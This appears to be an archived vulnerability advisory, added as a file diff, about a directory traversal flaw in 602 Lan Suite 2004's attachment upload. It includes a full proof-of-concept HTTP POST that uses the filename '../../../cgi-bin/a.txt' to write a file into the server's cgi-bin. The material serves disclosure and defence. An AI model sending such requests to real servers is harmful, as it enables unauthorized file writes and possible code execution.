@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/12495/info
+
+602 Lan Suite 2004 is reportedly affected by a vulnerability regarding the uploading of file attachments. This issue is due to the application failing to properly sanitize the names of file attachments before upload. A malicious user could exploit this vulnerability using directory traversal attacks to upload a file to an arbitrary location accessible by the affected server.
+
+This vulnerability could lead to the execution of a malicious file on the server hosting the application.
+
+602 Lan Suite 2004 version 2004.0.04.1221 is reportedly vulnerable; other versions may also be affected. 
+
+POST /mail HTTP/1.0
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------287661860715985
+Content-length: 540
+
+-----------------------------287661860715985
+Content-Disposition: form-data; name="U"
+
+6E13745843714258F86310B04D7
+-----------------------------287661860715985
+Content-Disposition: form-data; name="A"
+
+ATTACHMENTS
+-----------------------------287661860715985
+Content-Disposition: form-data; name="FILENAME"; filename="../../../cgi-bin/a.txt"
+Content-Type: text/plain
+
+Test File
+-----------------------------287661860715985
+Content-Disposition: form-data; name="ATTACH"
+
+Attach
+-----------------------------287661860715985-- 
